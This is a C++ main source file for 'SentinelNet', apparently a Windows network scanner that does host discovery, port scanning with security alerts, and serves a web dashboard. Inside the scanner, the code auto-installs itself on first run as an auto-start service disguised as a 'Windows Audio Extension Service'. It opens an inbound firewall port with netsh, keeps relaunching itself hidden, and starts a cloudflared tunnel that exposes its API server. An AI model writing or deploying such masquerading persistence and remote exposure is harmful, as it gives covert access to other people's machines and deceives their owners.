#include "cli.h"
#include "detection.h"
#include "logger.h"
#include "network_utils.h"
#include "packet_monitor.h"
#include "scanner.h"
#include "server.h"
#include "tunnel.h"
#include <algorithm>
#include <iostream>
#include <map>
#include <sstream>
#include <userenv.h>
#include <vector>
#include <windows.h>
#include <winsvc.h>
#include <wtsapi32.h>


#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")

// Service global variables
SERVICE_STATUS g_status = {0};
SERVICE_STATUS_HANDLE g_statusHandle = nullptr;
HANDLE g_stopEvent = INVALID_HANDLE_VALUE;

int g_dashboardPort = 8080;
const char *SERVICE_NAME = "WinAudioExtSvc";
const char *SERVICE_DISPLAY = "Windows Audio Extension Service";
const char *SERVICE_DESC = "Provides advanced audio processing and device "
                           "monitoring for Windows Audio Service.";

std::map<int, std::string> getPortServices() {
  return {{21, "FTP"},          {22, "SSH"},       {23, "Telnet"},
          {25, "SMTP"},         {80, "HTTP"},      {135, "RPC"},
          {139, "NetBIOS"},     {443, "HTTPS"},    {445, "SMB"},
          {1433, "MS SQL"},     {3306, "MySQL"},   {3389, "RDP"},
          {5432, "PostgreSQL"}, {5433, "HTTP Alt"}};
}

void displayScanResults(const std::string &target,
                        const std::vector<int> &openPorts) {
  auto services = getPortServices();

  if (openPorts.empty()) {
    std::cout << "No open ports found on " << target << std::endl;
  } else {
    std::cout << "\nOpen ports on " << target << ":" << std::endl;
    for (int port : openPorts) {
      std::cout << "  Port " << port;
      if (services.count(port)) {
        std::cout << " (" << services[port] << ")";
      }
      std::cout << " is OPEN" << std::endl;
    }
    std::cout << "\nTotal: " << openPorts.size() << " open port(s)"
              << std::endl;
  }
}

void testNetworkUtils() {
  std::cout << "\n=== Testing Network Utils ===" << std::endl;

  std::cout << "\nIP Conversion Test:" << std::endl;
  uint32_t ip = NetworkUtils::ipToInt("10.0.0.87");
  std::cout << "10.0.0.87 as integer: " << ip << std::endl;
  std::cout << "Back to IP: " << NetworkUtils::intToIp(ip) << std::endl;

  std::cout << "\nCIDR Test (10.0.0.0/29 - only 6 IPs):" << std::endl;
  auto cidr_ips = NetworkUtils::expandCIDR("10.0.0.0/29");
  std::cout << "Generated " << cidr_ips.size() << " IPs:" << std::endl;
  for (const auto &ip : cidr_ips) {
    std::cout << "  " << ip << std::endl;
  }

  std::cout << "\nRange Test (10.0.0.1-10.0.0.5):" << std::endl;
  auto range_ips = NetworkUtils::expandRange("10.0.0.1-10.0.0.5");
  std::cout << "Generated " << range_ips.size() << " IPs:" << std::endl;
  for (const auto &ip : range_ips) {
    std::cout << "  " << ip << std::endl;
  }

  std::cout << "\n=== Tests Complete ===" << std::endl;
}

void performNetworkDiscovery(NetworkScanner &scanner, logger &log,
                             const CLIOptions &options) {
  std::cout << "\n=== Network Discovery ===" << std::endl;

  // Expand the range into individual IPs
  std::vector<std::string> targets;

  try {
    // Check if it's CIDR notation or IP range
    if (options.discoverRange.find('/') != std::string::npos) {
      // CIDR notation (e.g., 10.0.0.0/24)
      std::cout << "Expanding CIDR range: " << options.discoverRange
                << std::endl;
      targets = NetworkUtils::expandCIDR(options.discoverRange);
    } else if (options.discoverRange.find('-') != std::string::npos) {
      // IP range (e.g., 10.0.0.1-10.0.0.50)
      std::cout << "Expanding IP range: " << options.discoverRange << std::endl;
      targets = NetworkUtils::expandRange(options.discoverRange);
    } else {
      std::cerr << "Invalid range format. Use CIDR (10.0.0.0/24) or range "
                   "(10.0.0.1-10.0.0.50)"
                << std::endl;
      return;
    }
  } catch (const std::exception &e) {
    std::cerr << "Error parsing range: " << e.what() << std::endl;
    return;
  }

  std::cout << "Scanning " << targets.size() << " potential hosts..."
            << std::endl;
  std::cout << "This may take 30-60 seconds...\n" << std::endl;

  std::vector<std::string> liveHosts;
  int checked = 0;

  // Ping all hosts in range
  for (const auto &ip : targets) {
    checked++;

    if (checked % 25 == 0) {
      std::cout << "Progress: " << checked << "/" << targets.size()
                << " checked..." << std::endl;
    }

    if (scanner.isHostAlive(ip, 200)) {
      liveHosts.push_back(ip);
      std::cout << "  [FOUND] " << ip << std::endl;
    }
  }

  std::cout << "\nDiscovery complete: Found " << liveHosts.size()
            << " live device(s)" << std::endl;

  log.logMessage("Network discovery: " + std::to_string(liveHosts.size()) +
                 " live hosts found in range " + options.discoverRange);

  // Scan live hosts if ports specified
  if (!options.ports.empty() && !liveHosts.empty()) {
    auto services = getPortServices();
    SecurityDetection detector;

    std::cout << "\n=== Scanning Live Devices ===" << std::endl;

    int totalAlerts = 0;

    for (const auto &host : liveHosts) {
      std::cout << "\nScanning " << host << "..." << std::endl;
      auto openPorts = scanner.scanPorts(host, options.ports);
      log.logScanResult(host, openPorts);

      if (openPorts.empty()) {
        std::cout << "  No open ports found" << std::endl;
      } else {
        // Display open ports
        for (int port : openPorts) {
          std::cout << "  Port " << port;
          if (services.count(port)) {
            std::cout << " (" << services[port] << ")";
          }
          std::cout << " is OPEN" << std::endl;
        }

        auto alerts = detector.analyzeOpenPorts(host, openPorts);
        if (!alerts.empty()) {
          std::cout << "\n  SECURITY ALERTS:" << std::endl;
          for (const auto &alert : alerts) {
            std::string color = SecurityDetection::getThreatColor(alert.level);
            std::string reset = "\033[0m";

            std::cout << "  " << color << "["
                      << SecurityDetection::threatLevelToString(alert.level)
                      << "]" << reset << " Port " << alert.port << " - "
                      << alert.message << std::endl;
            std::cout << "      " << alert.recommendation << std::endl;

            totalAlerts++;

            log.logMessage("SECURITY ALERT [" +
                           SecurityDetection::threatLevelToString(alert.level) +
                           "] " + host + ":" + std::to_string(alert.port) +
                           " - " + alert.message);
          }
        }
      }
    }

    if (totalAlerts > 0) {
      std::cout << "\nSecurity Summary: Found " << totalAlerts
                << " potential security issue(s)" << std::endl;
      std::cout << "Check logs for details" << std::endl;
    }
  }

  else if (liveHosts.empty()) {
    std::cout << "\nNo live devices found in range." << std::endl;
  }

  else {
    std::cout << "\nTip: Add --quick or --ports to scan the discovered devices."
              << std::endl;
  }
}

void runScanner(const CLIOptions &options, NetworkScanner &scanner,
                logger &log) {
  // Show help
  if (options.showHelp) {
    CLIParser::printHelp();
    return;
  }

  // List interfaces
  if (options.listInterfaces) {
    auto interfaces = scanner.getInterfaces();
    std::cout << "\nNetwork Interfaces:" << std::endl;
    for (const auto &i : interfaces) {
      std::cout << "  " << i.name << " | IP: " << i.ip << std::endl;
    }
    // REMOVED return here to allow flow to scan
  }

  // NEW: Start web dashboard
  if (options.startDashboard) {
    std::cout << "\n=== Starting Web Dashboard ===" << std::endl;
    std::cout << "Open your browser to http://localhost:"
              << options.dashboardPort << std::endl;
    std::cout << "Press Ctrl+C to stop\n" << std::endl;
    APIServer server(options.dashboardPort);
    log.logMessage("Web dashboard started on port " +
                   std::to_string(options.dashboardPort));
    server.start();
    return;
  }

  if (options.discover && !options.discoverRange.empty()) {
    performNetworkDiscovery(scanner, log, options);
    return;
  }

  // Perform scan if target specified or options like quick/full are set
  if (!options.target.empty() && !options.ports.empty()) {
    std::cout << "Scanning " << options.target << "..." << std::endl;

    auto openPorts = scanner.scanPorts(options.target, options.ports);
    log.logScanResult(options.target, openPorts);

    displayScanResults(options.target, openPorts);
  } else if (!options.ports.empty()) {
    // Default to localhost if ports are provided (e.g. from -q or -f) but no
    // target
    std::string defaultTarget = "127.0.0.1";
    std::cout << "Scanning " << defaultTarget << "..." << std::endl;

    auto openPorts = scanner.scanPorts(defaultTarget, options.ports);
    log.logScanResult(defaultTarget, openPorts);
    displayScanResults(defaultTarget, openPorts);
  } else {
    // No target and no scan type specified
    std::cout << "No target or scan type specified. Use -h for help."
              << std::endl;
  }
}

// ── Windows Service implementation ───────────────────────────────────────────

void setServiceStatus(DWORD state, DWORD exitCode = NO_ERROR) {
  g_status.dwCurrentState = state;
  g_status.dwWin32ExitCode = exitCode;
  g_status.dwWaitHint = (state == SERVICE_START_PENDING) ? 3000 : 0;
  SetServiceStatus(g_statusHandle, &g_status);
}

VOID WINAPI ServiceCtrlHandler(DWORD ctrl) {
  if (ctrl == SERVICE_CONTROL_STOP || ctrl == SERVICE_CONTROL_SHUTDOWN) {
    setServiceStatus(SERVICE_STOP_PENDING);
    SetEvent(g_stopEvent);
  }
}

VOID WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
  g_statusHandle =
      RegisterServiceCtrlHandlerA(SERVICE_NAME, ServiceCtrlHandler);
  if (!g_statusHandle)
    return;

  g_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
  g_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
  setServiceStatus(SERVICE_START_PENDING);

  g_stopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
  if (!g_stopEvent) {
    setServiceStatus(SERVICE_STOPPED, GetLastError());
    return;
  }

  setServiceStatus(SERVICE_RUNNING);

  CreateThread(
      nullptr, 0,
      [](LPVOID) -> DWORD {
        while (true) {
          char exePath[MAX_PATH];
          GetModuleFileNameA(nullptr, exePath, MAX_PATH);
          std::string cmd = std::string("\"") + exePath + "\" --user-session";

          std::string exeDir(exePath);
          exeDir = exeDir.substr(0, exeDir.rfind('\\'));

          STARTUPINFOA si = {sizeof(si)};
          PROCESS_INFORMATION pi = {};

          BOOL ok = CreateProcessA(nullptr, const_cast<char *>(cmd.c_str()),
                                   nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                                   nullptr, exeDir.c_str(), &si, &pi);

          if (ok) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
          }

          Sleep(5000); // Wait and restart if process exits
        }
        return 0;
      },
      nullptr, 0, nullptr);

  WaitForSingleObject(g_stopEvent, INFINITE);

  setServiceStatus(SERVICE_STOPPED);
}

bool isRunningAsAdmin() {
  BOOL isAdmin = FALSE;
  PSID adminGroup = nullptr;
  SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
  if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                               DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                               &adminGroup)) {
    CheckTokenMembership(nullptr, adminGroup, &isAdmin);
    FreeSid(adminGroup);
  }
  return isAdmin != FALSE;
}

bool installService() {
  char exePath[MAX_PATH];
  GetModuleFileNameA(nullptr, exePath, MAX_PATH);
  std::string cmd = std::string("\"") + exePath + "\" --service";

  if (!isRunningAsAdmin()) {
    std::cerr << "[ERROR] Cannot install service: not running as Administrator."
              << std::endl;
    std::cerr
        << "        Right-click the exe and select 'Run as administrator'."
        << std::endl;
    return false;
  }

  SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
  if (!scm) {
    std::cerr << "[ERROR] OpenSCManager failed (error " << GetLastError()
              << ")." << std::endl;
    return false;
  }

  SC_HANDLE svc = CreateServiceA(
      scm, SERVICE_NAME, SERVICE_DISPLAY, SERVICE_ALL_ACCESS,
      SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
      cmd.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);

  if (!svc) {
    DWORD err = GetLastError();
    if (err == ERROR_SERVICE_EXISTS) {
      std::cerr << "[WARN] Service already exists." << std::endl;
    } else {
      std::cerr << "[ERROR] CreateService failed (error " << err << ")."
                << std::endl;
    }
    CloseServiceHandle(scm);
    return false;
  }

  std::cout << "[OK] Service '" << SERVICE_NAME << "' installed successfully."
            << std::endl;

  SERVICE_DESCRIPTIONA desc;
  desc.lpDescription = const_cast<char *>(SERVICE_DESC);
  ChangeServiceConfig2A(svc, SERVICE_CONFIG_DESCRIPTION, &desc);

  // Auto-add firewall rule so PC1 can connect without manual steps
  system(
      "netsh advfirewall firewall delete rule name=\"SentinelNet\" >nul 2>&1");
  system("netsh advfirewall firewall add rule name=\"SentinelNet\" dir=in "
         "action=allow protocol=TCP localport=8080 >nul 2>&1");

  if (!StartServiceA(svc, 0, nullptr)) {
    std::cerr << "[WARN] Service installed but failed to start (error "
              << GetLastError() << ")." << std::endl;
  } else {
    std::cout << "[OK] Service started." << std::endl;
  }

  CloseServiceHandle(svc);
  CloseServiceHandle(scm);
  return true;
}

bool uninstallService() {
  SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
  if (!scm)
    return false;
  SC_HANDLE svc = OpenServiceA(scm, SERVICE_NAME, SERVICE_STOP | DELETE);
  if (!svc) {
    CloseServiceHandle(scm);
    return false;
  }
  SERVICE_STATUS status;
  ControlService(svc, SERVICE_CONTROL_STOP, &status);
  Sleep(1000);
  DeleteService(svc);
  CloseServiceHandle(svc);
  CloseServiceHandle(scm);
  return true;
}

// ── Entry point
// ───────────────────────────────────────────────────────────────

int main(int argc, char *argv[]) {
  // Called by service to run in user session (has desktop access)
  if (argc > 1 && std::string(argv[1]) == "--user-session") {
    // Set working directory to exe folder
    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    std::string exeDir(exePath);
    exeDir = exeDir.substr(0, exeDir.rfind('\\'));
    SetCurrentDirectoryA(exeDir.c_str());

    logger log;
    log.logMessage("SentinelNet user session started");

    // Start cloudflared tunnel on background thread
    CreateThread(
        nullptr, 0,
        [](LPVOID) -> DWORD {
          TunnelManager tunnel;
          tunnel.start();
          return 0;
        },
        nullptr, 0, nullptr);

    APIServer server(g_dashboardPort);
    server.start();
    return 0;
  }

  // Called internally by Windows when running as a service
  if (argc > 1 && std::string(argv[1]) == "--service") {
    SERVICE_TABLE_ENTRYA table[] = {
        {const_cast<char *>(SERVICE_NAME), ServiceMain}, {nullptr, nullptr}};
    StartServiceCtrlDispatcherA(table);
    return 0;
  }

  // Cleanup flag
  if (argc > 1 && std::string(argv[1]) == "--uninstall") {
    return uninstallService() ? 0 : 1;
  }

  // CLI Options parsing
  CLIOptions options;
  try {
    options = CLIParser::parse(argc, argv);
  } catch (...) {
  }

  // Auto-install service on first run if it doesn't exist
  SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
  if (scm) {
    SC_HANDLE existing = OpenServiceA(scm, SERVICE_NAME, SERVICE_QUERY_STATUS);
    if (!existing) {
      CloseServiceHandle(scm);
      // Try to install. If it fails (e.g. no Admin), it will fall through to
      // CLI mode.
      if (installService()) {
        std::cout << "[INFO] Initial setup complete. SentinelNet is now "
                     "running as a background service."
                  << std::endl;
        return 0;
      }
    } else {
      CloseServiceHandle(existing);
      CloseServiceHandle(scm);
    }
  }

  NetworkScanner scanner;
  logger log;

  log.logMessage("SentinelNet started");

  if (argc > 1) {
    // CLI Mode: Process arguments and exit
    if (std::string(argv[1]) == "--testNU") {
      testNetworkUtils();
      return 0;
    }

    CLIOptions options = CLIParser::parse(argc, argv);
    runScanner(options, scanner, log);
  } else {
    // Shell Mode: Interactive loop
    std::cout << "\n=== SentinelNet Shell ===" << std::endl;
    std::cout << "Type '-h' or '--help' to see available commands."
              << std::endl;
    std::cout << "Type 'exit' or 'quit' to close." << std::endl;

    std::string input;
    while (true) {
      std::cout << "\nSentinelNet> ";
      if (!std::getline(std::cin, input) || input == "exit" ||
          input == "quit") {
        break;
      }

      if (input.empty())
        continue;

      // Tokenize input for the parser
      std::stringstream ss(input);
      std::string token;
      std::vector<char *> args;

      // Dummy argv[0]
      char progName[] = "SentinelNet";
      args.push_back(progName);

      std::vector<std::string> tokens;
      while (ss >> token) {
        tokens.push_back(token);
      }

      for (auto &t : tokens) {
        args.push_back(const_cast<char *>(t.c_str()));
      }

      CLIOptions options =
          CLIParser::parse(static_cast<int>(args.size()), args.data());
      runScanner(options, scanner, log);
    }
  }

  log.logMessage("SentinelNet shutdown");
  return 0;
}
